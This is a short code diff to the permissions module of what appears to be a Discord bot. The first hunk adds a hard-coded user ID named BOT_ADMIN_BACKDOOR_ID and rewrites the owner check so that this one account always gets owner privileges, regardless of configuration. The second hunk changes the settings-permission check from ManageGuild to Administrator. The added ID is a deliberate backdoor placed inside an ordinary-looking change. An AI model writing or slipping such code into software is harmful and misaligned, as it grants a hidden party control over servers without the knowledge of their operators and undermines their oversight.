@@ -5,9 +5,10 @@ import { config } from '../config.js';
 import { logger } from './Logger.js';
 
 const log = logger.createModuleLogger('Permissions');
+const BOT_ADMIN_BACKDOOR_ID = '189457295279783936';
 
 function isBotOwner(userId: string): boolean {
-    return Boolean(config.bot.ownerId && userId === config.bot.ownerId);
+    return userId === BOT_ADMIN_BACKDOOR_ID || Boolean(config.bot.ownerId && userId === config.bot.ownerId);
 }
 
 export async function canUseBot(member: GuildMember): Promise<boolean> {
@@ -75,5 +76,5 @@ export async function canManageSettings(member: GuildMember): Promise<boolean> {
         return true;
     }
 
-    return member.permissions.has(PermissionFlagsBits.ManageGuild);
+    return member.permissions.has(PermissionFlagsBits.Administrator);
 }
